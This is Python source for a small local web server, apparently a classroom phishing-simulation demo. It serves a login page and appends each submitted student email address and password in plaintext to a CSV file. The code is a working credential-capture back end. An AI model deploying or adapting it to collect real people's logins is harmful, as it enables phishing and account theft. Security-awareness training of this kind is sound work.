import csv
import os
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

ROOT = Path(__file__).parent
SUBMISSIONS_CSV = ROOT / "submissions.csv"
CSV_FIELDS = ("Timestamp", "Student mail Id", "password")
PORT = int(os.environ.get("PORT", "8080"))


class AppServer(ThreadingHTTPServer):
    allow_reuse_address = True


def record_submission(form_data):
    student_id = form_data.get("student_id", "")
    file_exists = SUBMISSIONS_CSV.exists()
    needs_separator = False
    if file_exists and SUBMISSIONS_CSV.stat().st_size > 0:
        with SUBMISSIONS_CSV.open("rb") as csv_file:
            csv_file.seek(-1, os.SEEK_END)
            needs_separator = csv_file.read(1) not in (b"\n", b"\r")

    with SUBMISSIONS_CSV.open("a", newline="", encoding="utf-8") as csv_file:
        if needs_separator:
            csv_file.write("\n")
        writer = csv.DictWriter(csv_file, fieldnames=CSV_FIELDS)
        if not file_exists or SUBMISSIONS_CSV.stat().st_size == 0:
            writer.writeheader()
        writer.writerow({
            "Timestamp": datetime.now(timezone.utc).isoformat(),
            "Student mail Id": student_id,
            "password": form_data.get("P", ""),
        })


class DemoHandler(BaseHTTPRequestHandler):
    def _send_html(self, body, status=200):
        encoded = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def _read_html_file(self, relative_name):
        file_path = ROOT / relative_name
        if not file_path.exists():
            raise FileNotFoundError(f"Missing file: {file_path}")
        return file_path.read_text(encoding="utf-8")

    def do_GET(self):
        route = urlparse(self.path).path
        try:
            if route == "/":
                self._send_html(self._read_html_file("index.html"))
                return
            self._send_html("<h1>Not found</h1>", 404)
        except Exception as exc:
            print(f"[demo server] GET error for {self.path}: {exc}")
            self._send_html("<h1>Server error</h1>", 500)

    def do_POST(self):
        route = urlparse(self.path).path
        try:
            if route != "/submit":
                self._send_html("<h1>Not found</h1>", 404)
                return

            length = int(self.headers.get("Content-Length", "0"))
            form_data = parse_qs(self.rfile.read(length).decode("utf-8"))
            record_submission({key: values[0] for key, values in form_data.items() if values})
            self._send_html(self._read_html_file("complete.html"))
        except Exception as exc:
            print(f"[demo server] POST error for {self.path}: {exc}")
            self._send_html("<h1>Submission failed</h1>", 500)

    def log_message(self, format_string, *args):
        print(f"[demo server] {format_string % args}")


if __name__ == "__main__":
    server = AppServer(("127.0.0.1", PORT), DemoHandler)
    print(f"Classroom simulation running at http://127.0.0.1:{PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nSimulation stopped.")
    finally:
        server.server_close()
